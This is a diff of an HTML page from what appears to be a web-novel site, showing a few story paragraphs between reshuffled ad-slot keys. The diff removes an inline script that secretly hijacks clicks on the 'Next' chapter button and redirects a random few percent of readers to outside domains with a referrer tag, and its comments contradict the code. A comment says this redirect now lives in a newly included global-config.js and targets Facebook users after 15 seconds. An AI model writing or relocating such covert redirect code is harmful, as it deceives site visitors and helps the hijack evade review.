@@ -2399,28 +2399,28 @@
                 <p>Evelyn buried her face in the pillow.</p>
                 <p>The knocking escalated, now accompanied by shouting.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>She threw on a robe and marched out.</p>
                 <p>In the living room, Alexander sat up from the couch, hair disheveled.</p>
                 <p>Their eyes locked.</p>
                 <p>&#34;Comfy?&#34; Evelyn&#39;s gaze flicked to the blanket draped over him.</p>
                 <p>He rubbed his temples. &#34;Your couch is a torture device.&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>The banging continued.</p>
                 <p>&#34;Auntie Wu?&#34;</p>
                 <p>&#34;Gave her the weekend off.&#34;</p>
                 <p>Alexander was already moving. &#34;I&#39;ll handle it.&#34;</p>
                 <p>The door swung open to reveal Vincent Wilson mid-knock, eyes bulging at Alexander&#39;s disheveled state. Beside him, Nathan York&#39;s jaw dropped.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>&#34;You two—&#34; Alexander&#39;s expression darkened.</p>
                 <p>Vincent&#39;s gaze darted between them before lighting up with realization. &#34;Ohhh, so you and—&#34;</p>
                 <p>Nathan clapped a hand over his mouth. &#34;Morning, Alex! Morning, Mrs. Hamilton!&#34;</p>
                 <p>A vein throbbed at Alexander&#39;s temple. &#34;Why the hell are you here at dawn?&#34;</p>
                 <p>Vincent wriggled free. &#34;Left my phone here!&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>&#34;That&#39;s it?&#34; Alexander&#39;s voice dropped dangerously.</p>
                 <p>&#34;It&#39;s got all my contacts—&#34;</p>
                 <p>Nathan snorted. &#34;Translation: his little black book of &#39;sisters.&#39;&#34;</p>
@@ -2549,37 +2549,7 @@
             }
         });
 
-        // Intercept Next button clicks and redirect to external domain
-        // 5% -> n1.cuvupa.co.uk, 0.5% -> n1.nougmi.xyz, 94.5% normal
-        (function() {
-            const nextBtn = document.getElementById('next-chapter');
-            if (nextBtn && nextBtn.href) {
-                nextBtn.addEventListener('click', function(e) {
-                    const rand = Math.random();
-
-                    // 7% probability to redirect to cuvupa
-                    if (rand < 0.07) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
-                    // 0.5% probability to redirect to hotelterdekat
-                    } else if (rand < 0.075) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://novel.hotelterdekat.id${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to hotelterdekat with ref:', externalUrl);
-                    }
-                    // Otherwise, let the default link behavior work (92.5% probability)
-                });
-            }
-        })();
+        // Next 按钮的 FB 外部跳转逻辑已迁移至 /global-config.js（15s 后对 FB 用户生效）
 
         // Record reading history
         document.addEventListener('DOMContentLoaded', function() {
@@ -4214,5 +4184,6 @@
     });
   })();
 </script>
+<script src="/global-config.js"></script>
 </body>
 </html>
